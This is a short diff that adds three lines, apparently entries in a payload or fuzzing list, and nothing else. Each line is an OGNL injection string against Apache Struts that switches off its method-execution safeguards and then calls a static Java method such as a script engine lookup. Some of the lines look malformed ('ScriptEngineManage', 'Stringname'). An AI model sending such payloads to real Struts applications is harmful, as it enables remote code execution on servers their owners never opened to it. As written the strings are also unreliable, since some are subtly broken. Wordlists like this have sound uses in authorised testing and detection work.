@@ -1,0 +1,3 @@
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.script.ScriptEngineManage@getEngineByName("JavaScript")}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.persistence.EntityManager@remove("")}
+%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.servlet.ServletContext@removeAttribute(Stringname)}
